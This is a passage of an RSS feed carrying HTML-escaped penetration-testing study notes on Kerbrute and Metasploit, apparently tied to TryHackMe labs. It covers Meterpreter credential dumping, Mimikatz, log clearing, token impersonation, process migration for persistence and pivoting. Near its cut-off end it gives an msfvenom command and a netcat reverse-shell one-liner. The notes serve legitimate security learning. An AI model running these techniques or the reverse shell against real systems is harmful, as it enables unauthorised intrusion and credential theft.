			<description>&lt;p&gt;Kerbrute works by sending a single UDP packet to the authentication service to begin the authentication process, but then doesn't complete the transaction as to avoid an actual login failure (and the associated logging). While this doesn't grant access to anything, it does allow domain users to be enumerated using a wordlist.&lt;/p&gt;&lt;p&gt;To use kerbrute you need to meet one of the following requirements:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Already be on the domain you are attacking, &lt;em&gt;or&lt;/em&gt;&lt;/li&gt;&lt;li&gt;Know the IP address of the domain controller (which normally hosts the KDC). This can be manually mapped in /etc/hosts or just specified as a raw IP using the &lt;code&gt;--dc&lt;/code&gt; flag.&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/attackingkerberos&quot;&gt;TryHackMe: Attacking Kerberos&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/attacktivedirectory&quot;&gt;Attacktive Directory&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Kerbrute.md</guid>
		</item>
		<item>
			<title>Using Metasploit</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Metasploit.md</link>
			<description>&lt;h2 id=&quot;console-msfconsole&quot;&gt;Console (âmsfconsoleâ)&lt;/h2&gt;&lt;p&gt;Basic Metasploit flow:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;use $MODULE_NAME&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;set $OPTIONS&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You can use msfconsole as a shell, but thereâs no redirect functionality.&lt;/p&gt;&lt;h3 id=&quot;commands&quot;&gt;Commands&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;back&lt;/code&gt; â exit the current module&lt;/li&gt;&lt;li&gt;&lt;code&gt;db_nmap $FLAGS $IP&lt;/code&gt; â run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary&lt;/li&gt;&lt;li&gt;&lt;code&gt;help&lt;/code&gt; â get metasploit help&lt;/li&gt;&lt;li&gt;&lt;code&gt;history&lt;/code&gt; â display command history&lt;/li&gt;&lt;li&gt;&lt;code&gt;hosts&lt;/code&gt; â display known hosts in DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;hosts -d&lt;/code&gt; â delete saved hosts from DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;info&lt;/code&gt; â show module information (including exploit target options)&lt;/li&gt;&lt;li&gt;&lt;code&gt;jobs&lt;/code&gt; â check the status of background jobs&lt;/li&gt;&lt;li&gt;&lt;code&gt;options&lt;/code&gt; (&lt;code&gt;advanced&lt;/code&gt;)- show module/exploit options (or âadvancedâ options)&lt;/li&gt;&lt;li&gt;&lt;code&gt;run&lt;/code&gt;/&lt;code&gt;exploit&lt;/code&gt; â run the selected exploit&lt;/li&gt;&lt;li&gt;&lt;code&gt;run -j&lt;/code&gt; â run the selected exploit as a background job&lt;/li&gt;&lt;li&gt;&lt;code&gt;search&lt;/code&gt; â search modules; query to a particular type of module using the &lt;code&gt;type:&lt;/code&gt; parameter (e.g., &lt;code&gt;search type:exploit wordpress&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;&lt;code&gt;services&lt;/code&gt; â display services discovered in known hosts in DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;sessions&lt;/code&gt; â list open Meterpreter sessions on a box&lt;/li&gt;&lt;li&gt;&lt;code&gt;sessions -i $SESSION_NUMER&lt;/code&gt; â connect to Meterpreter session $SESSION_NUMBER&lt;/li&gt;&lt;li&gt;&lt;code&gt;show auxiliary&lt;/code&gt; â show auxiliary modules, filtered by relevancy if called from within a module&lt;/li&gt;&lt;li&gt;&lt;code&gt;show exploits&lt;/code&gt; â show exploit modules&lt;/li&gt;&lt;li&gt;&lt;code&gt;show options&lt;/code&gt; â show module options&lt;/li&gt;&lt;li&gt;&lt;code&gt;show payloads&lt;/code&gt; â show payload modules, filtered by relevancy if called from within a module&lt;/li&gt;&lt;li&gt;&lt;code&gt;spool&lt;/code&gt; â save all console output to a log file (useful for record-keeping)&lt;/li&gt;&lt;li&gt;&lt;code&gt;use&lt;/code&gt; â select a Metasploit module/exploit&lt;/li&gt;&lt;li&gt;&lt;code&gt;vulns&lt;/code&gt; â display vulnerabilities discovered in known hosts in DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;workspace&lt;/code&gt; â use workspaces; keeps database results isolated per engagement&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that you can also call regular shell commands (&lt;code&gt;ip&lt;/code&gt;, &lt;code&gt;ls&lt;/code&gt;, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you donât have to worry about backgrounding the entire msfconsole).&lt;/p&gt;&lt;h4 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22nmap%22.md&quot;&gt;Using ânmapâ&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;modules&quot;&gt;Modules&lt;/h3&gt;&lt;p&gt;Module categories:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Auxiliary (odds-n-ends)&lt;/li&gt;&lt;li&gt;Encoders (re-encode exploits to thwart signature-based anti-malware solutions)&lt;/li&gt;&lt;li&gt;Evasion (attempt to directly evade anti-malware solutions)&lt;/li&gt;&lt;li&gt;Exploits&lt;/li&gt;&lt;li&gt;NOPS (no-op code that can be used to pad exploits to a needed size)&lt;/li&gt;&lt;li&gt;Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)&lt;/li&gt;&lt;li&gt;Post (additional post-exploitation tools)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that Metasploit 6 apparently calls these âframework pluginsâ now.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Remember:&lt;/strong&gt; Open up the port Metasploitâs going to use in your firewall &lt;em&gt;before&lt;/em&gt; running the exploit. Generally this is port 4444 by default (set with LPORT).&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Also Remember:&lt;/strong&gt; Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if itâs not indicated by the module. Metasploitâs guesses about which interface to use arenât always correctâ¦ (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Also ALSO Remember:&lt;/strong&gt; Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if youâre trying to exploit a service thatâs not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machineâs external address, as the exploit wonât be connecting back over the SSH tunnel (obviously)!&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;module-options&quot;&gt;Module Options&lt;/h3&gt;&lt;p&gt;The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as &lt;code&gt;file:/path/to/file.txt&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;Most modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are &lt;em&gt;not&lt;/em&gt; shown when running &lt;code&gt;show options&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;You can reset individual parameters using &lt;code&gt;unset&lt;/code&gt;, and reset the entire module using &lt;code&gt;unset all&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Equivalent module commands:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;set -g&lt;/code&gt; = &lt;code&gt;setg&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;unset -g&lt;/code&gt; = &lt;code&gt;unsetg&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;run&lt;/code&gt; = &lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Some exploit modules have a &lt;code&gt;check&lt;/code&gt; option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many &lt;em&gt;donât&lt;/em&gt; have a check at all. YMMV!&lt;/p&gt;&lt;h3 id=&quot;scanners&quot;&gt;Scanners&lt;/h3&gt;&lt;p&gt;Use &lt;code&gt;search portscan&lt;/code&gt; to display built-in Metasploit port scanners. Note that &lt;code&gt;msfconsole&lt;/code&gt; needs to be run as root for many scans to work â just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) donât work over a VPNâ¦ So maybe best to stick with Nmap.&lt;/p&gt;&lt;p&gt;Targeted scanners can be more useful, however:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The &lt;code&gt;auxiliary/scanner/discovery/udp_sweep&lt;/code&gt; module will probe for common UDP services.&lt;/li&gt;&lt;li&gt;The &lt;code&gt;auxiliary/scanner/http/http_version&lt;/code&gt; module will give you HTTP server version information.&lt;/li&gt;&lt;li&gt;The &lt;code&gt;auxiliary/scanner/smb/smb_login&lt;/code&gt; module will allow you to conduct brute-force and password spraying attacks against Samba logins.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Metasploit has a variety of Samba/CIFS scanners too (use &lt;code&gt;search scanner/smb&lt;/code&gt; to list them), as well as modules for basic enumeration such as &lt;code&gt;smtp_version&lt;/code&gt;/&lt;code&gt;smtp_enum&lt;/code&gt; (for SMTP) and &lt;code&gt;mysql_sql&lt;/code&gt; (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).&lt;/p&gt;&lt;h4 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/&quot;&gt;Metasploit Documentation: Scanning and Managing Hosts&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;payloads&quot;&gt;Payloads&lt;/h3&gt;&lt;p&gt;Payloads can be divided into:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Singles (self-contained; also indicated by the use of an &lt;code&gt;_&lt;/code&gt; separating âshellâ from the rest of the payload name, as in &lt;code&gt;shell_reverse_tcp&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)&lt;/li&gt;&lt;li&gt;Stages (payloads designed to be downloaded by a stager; also indicated by the use of a &lt;code&gt;/&lt;/code&gt; separating âshellâ from the rest of the payload name, as in &lt;code&gt;shell/reverse_tcp&lt;/code&gt;)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Metasploit defaults to sending 32-bit payloads, but an increasing number of things wonât work on a 64-bit system from a 32-bit meterpreter shell. Itâs probably best to explicitly set the &lt;code&gt;payload&lt;/code&gt; option to use a 64-bit payload unless you &lt;em&gt;know&lt;/em&gt; that youâll be dealing with a 32-bit system.&lt;/p&gt;&lt;p&gt;List all available payloads using &lt;code&gt;msfvenom --list payloads&lt;/code&gt; or &lt;code&gt;show payloads&lt;/code&gt; from within the Metasploit console.&lt;/p&gt;&lt;p&gt;A specific payload can be set in the Metasploit console use the &lt;code&gt;set PAYLOAD full/path/to/payload&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If you initially get a native shell, use the &lt;code&gt;post/multi/manage/shell_to_meterpreter&lt;/code&gt; module to upgrade to Meterpeter. (NOTE: shell_to_meterpreter creates a new connection on a new port, by default 4433.)&lt;/p&gt;&lt;h4 id=&quot;additional-resources-2&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue&quot;&gt;Metasploit Basics, Part 8: Exploitation with EternalBlue&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.tutorialspoint.com/metasploit/metasploit_payload.htm&quot;&gt;Metasploit â Payload&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h2&gt;&lt;p&gt;The Meterpreter reverse shell &lt;em&gt;requires&lt;/em&gt; a connection back to msfconsole using multi/handler.&lt;/p&gt;&lt;h3 id=&quot;commands-1&quot;&gt;Commands&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;background&lt;/code&gt; â background the current session and return to the Metasploit console&lt;/li&gt;&lt;li&gt;&lt;code&gt;clearenv&lt;/code&gt; â clears the (Windows) event logs (kinda obvious)&lt;/li&gt;&lt;li&gt;&lt;code&gt;creds_all&lt;/code&gt; â dump all user credentials in memory (requires the &lt;code&gt;kiwi&lt;/code&gt; module)&lt;/li&gt;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; â transfer a file from the target to the attacker&lt;/li&gt;&lt;li&gt;&lt;code&gt;edit&lt;/code&gt; â edit a file&lt;/li&gt;&lt;li&gt;&lt;code&gt;getpid&lt;/code&gt; â get current process ID&lt;/li&gt;&lt;li&gt;&lt;code&gt;getprivs&lt;/code&gt; â display current user privileges&lt;/li&gt;&lt;li&gt;&lt;code&gt;getsystem&lt;/code&gt; â attempt to elevate to SYSTEM/root&lt;/li&gt;&lt;li&gt;&lt;code&gt;getuid&lt;/code&gt; â get current process user&lt;/li&gt;&lt;li&gt;&lt;code&gt;golden_ticket_create&lt;/code&gt; â create a golden ticket (requires the &lt;code&gt;kiwi&lt;/code&gt; module)&lt;/li&gt;&lt;li&gt;&lt;code&gt;guid&lt;/code&gt; â get session ID&lt;/li&gt;&lt;li&gt;&lt;code&gt;hashdump&lt;/code&gt; â dump NTLM hashes from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash&lt;/li&gt;&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt; â display host network interface information&lt;/li&gt;&lt;li&gt;&lt;code&gt;info&lt;/code&gt; â get information about a Meterpreter extension&lt;/li&gt;&lt;li&gt;&lt;code&gt;load&lt;/code&gt; â load Meterpreter extension&lt;/li&gt;&lt;li&gt;&lt;code&gt;load kiwi&lt;/code&gt; â load Mimikatz extension&lt;/li&gt;&lt;li&gt;&lt;code&gt;migrate&lt;/code&gt; â migrate Meterpreter to another process&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat&lt;/code&gt; â display host network connections&lt;/li&gt;&lt;li&gt;&lt;code&gt;portfwd&lt;/code&gt; â forward a port on the host&lt;/li&gt;&lt;li&gt;&lt;code&gt;route&lt;/code&gt; â mess with the host routing tables&lt;/li&gt;&lt;li&gt;&lt;code&gt;run&lt;/code&gt; â run a meterpreter extension&lt;/li&gt;&lt;li&gt;&lt;code&gt;search&lt;/code&gt; â search for files&lt;/li&gt;&lt;li&gt;&lt;code&gt;sessions&lt;/code&gt; â switch to another (Metasploit) session&lt;/li&gt;&lt;li&gt;&lt;code&gt;shell&lt;/code&gt; â drop to system shell (return to Meterpreter using &lt;code&gt;CTRL + Z&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;&lt;code&gt;sysinfo&lt;/code&gt; â pull remote system information&lt;/li&gt;&lt;li&gt;&lt;code&gt;upload&lt;/code&gt; â transfer a file from the attacker to the target&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Meterpreter sessions can be backgrounded using the &lt;code&gt;background&lt;/code&gt; command, and all sessions can be backgrounded using &lt;code&gt;CTRL + Z&lt;/code&gt;. List sessions using the &lt;code&gt;sessions&lt;/code&gt; command, and foreground a session using &lt;code&gt;session -i #&lt;/code&gt;, where &lt;code&gt;#&lt;/code&gt; is the session number.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;sessions&lt;/code&gt; command is also used to connect to meterpreter sessions that have been caught after a successfully executed exploit.&lt;/p&gt;&lt;h3 id=&quot;modules-1&quot;&gt;Modules&lt;/h3&gt;&lt;p&gt;Potentially useful Metsploit modules to &lt;code&gt;run&lt;/code&gt; from/besides Meterpreter:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;post/windows/gather/checkvm&lt;/code&gt; â try to determine if weâre in a VM&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/multi/recon/local_exploit_suggester&lt;/code&gt; â find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/windows/gather/enum_shares&lt;/code&gt; â enumerate shares&lt;/li&gt;&lt;li&gt;&lt;code&gt;auxiliary/scanner/smb/smb_enumusers_domain&lt;/code&gt; â enumerate SMB domain users (requires existing admin credentials)&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/windows/gather/hashdump&lt;/code&gt; â same as the hashdump command, but pushes the hashes into the Metasploit DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/windows/gather/smart_hashdump GETSYSTEM=FALSE&lt;/code&gt; â same as the hashdump command, but pushes the hashes into the Metasploit DB and ignores system accounts&lt;/li&gt;&lt;li&gt;&lt;code&gt;auxiliary/analyze/crack_windows&lt;/code&gt; â sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/windows/manage/enable_rdp&lt;/code&gt; â enable RDP access (requires admin privileges)&lt;/li&gt;&lt;li&gt;&lt;code&gt;post/multi/manage/autoroute&lt;/code&gt; â manipulate target routing for pivoting&lt;/li&gt;&lt;li&gt;&lt;code&gt;auxiliary/server/socks_proxy&lt;/code&gt; â start a SOCKS proxy&lt;/li&gt;&lt;li&gt;&lt;code&gt;exploit/windows/local/persistence&lt;/code&gt; â sets up a persistent connection (you probably want to &lt;code&gt;set STARTUP SYSTEM&lt;/code&gt;)â¦ &lt;em&gt;without a password!&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; It is generally more useful to background Meterpreter and then run these commands through the Metasploit console, as within Meterpreter they need to have all options specified on the ârunâ command line (in the console you can access help, actually &lt;em&gt;see&lt;/em&gt; what the options are, etc.).&lt;/p&gt;&lt;p&gt;There seem to be a lot of options for the &lt;code&gt;post/multi/manage/autoroute&lt;/code&gt; and &lt;code&gt;auxiliary/server/socks_proxy&lt;/code&gt; modules, but I donât see a way to access them from Meterpreter (it looks like to get help you need to background Meterpreter and use the console).&lt;/p&gt;&lt;p&gt;The advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that youâre attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)&lt;/p&gt;&lt;h4 id=&quot;additional-resources-3&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20John%20the%20Ripper.md&quot;&gt;Using John the Ripper&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf&quot;&gt;Dumping Windows Password Hashes Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Windows%20Password%20Hashes.md&quot;&gt;Windows Password Hashes&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;loading-powershell&quot;&gt;Loading PowerShell&lt;/h3&gt;&lt;pre class=&quot;meterpreter&quot;&gt;&lt;code&gt;load powershell
powershell_shell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;Donât&lt;/em&gt; try to exit PowerShell â trying to do this produces consistent hangs for me. Instead, background the process with &lt;code&gt;^Z&lt;/code&gt;.&lt;/p&gt;&lt;h3 id=&quot;using-mimikatz&quot;&gt;Using Mimikatz&lt;/h3&gt;&lt;p&gt;Use &lt;code&gt;load kiwi&lt;/code&gt; to load up Mimikatz. Sub-commands:&lt;/p&gt;&lt;pre class=&quot;meterpreter&quot;&gt;&lt;code&gt;kerberos         # Attempt to retrieve kerberos creds
livessp          # Attempt to retrieve livessp creds
mimikatz_command # Run a custom commannd
msv              # Attempt to retrieve msv creds (hashes)
ssp              # Attempt to retrieve ssp creds
tspkg            # Attempt to retrieve tspkg creds
wdigest          # Attempt to retrieve wdigest creds
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;additional-resources-4&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Mimikatz.md&quot;&gt;Using Mimikatz&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;log-in-as-a-user&quot;&gt;Log In as a User&lt;/h3&gt;&lt;pre class=&quot;meterpreter&quot;&gt;&lt;code&gt;load incognito
list_tokens -u
impersonate_token $DOMAIN\\$USER
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not 100% sure where the âtokensâ come from hereâ¦ Mimikatz, maybe?&lt;/p&gt;&lt;h3 id=&quot;process-migration&quot;&gt;Process Migration&lt;/h3&gt;&lt;p&gt;I &lt;em&gt;think&lt;/em&gt; that Meterpreter is being run directly from memory, and what &lt;code&gt;migrate&lt;/code&gt; is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.&lt;/p&gt;&lt;p&gt;Reasons to migrate the Meterpreter process:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;For persistence (pick a long-running process)&lt;/li&gt;&lt;li&gt;To make sure that the Meterpreter &lt;em&gt;process&lt;/em&gt; has system privileges&lt;/li&gt;&lt;li&gt;To hide (pick a process less likely to be examined)&lt;/li&gt;&lt;li&gt;To stabilize the shell (initial exploits often produce somewhat unstable sessions)&lt;/li&gt;&lt;li&gt;To move laterally or escalate privileges within a system (if youâre lucky)&lt;/li&gt;&lt;li&gt;To gain additional capabilities&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In particular, harvesting credentials from LSASS requires that Meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating Meterpreter can help us realize this. The print spooler service (&lt;code&gt;spoolsv.exe&lt;/code&gt;) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use &lt;code&gt;lsass.exe&lt;/code&gt; directly if you feel like living dangerously.&lt;/p&gt;&lt;p&gt;Another example is that dumping keystrokes will only work when Meterpreter is attached to a word processor or text editor.&lt;/p&gt;&lt;p&gt;Note that Meterpreter will happily let you migrate from a privileged to an unprivileged process â which may cause you to loose control of the target system! Additionally, migrating Meterpreter will change its current working directory to that of the process itâs attaching to.&lt;/p&gt;&lt;p&gt;Executing &lt;code&gt;run post/windows/manage/migrate&lt;/code&gt; will cause Meterpreter to try to migrate to another process in an automated fashion. Iâm not sure how âsmartâ this is in practice.&lt;/p&gt;&lt;h4 id=&quot;additional-resources-5&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/a/92893&quot;&gt;How does process migration work in Meterpreter&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/&quot;&gt;Multiple Ways to Persistence on Windows 10 with Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-orientated programming (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;venom-msfvenom&quot;&gt;Venom (âmsfvenomâ)&lt;/h2&gt;&lt;p&gt;Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Use Metasploit to generate the code for a remote shell:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# &lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p cmd/unix/reverse_netcat &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;va&quot;&gt;lhost=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;lport=$LOCAL_PORT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Spin up a listener using netcat:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lvp &lt;span class=&quot;va&quot;&gt;$LOCAL_PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will generates code that looks like this:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mkfifo&lt;/span&gt; /tmp/qdsrgu&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;0&amp;lt;&lt;/span&gt;/tmp/qdsrgu &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;/bin/sh&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/qdsrgu &lt;span class=&quot;op&quot;&gt;2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
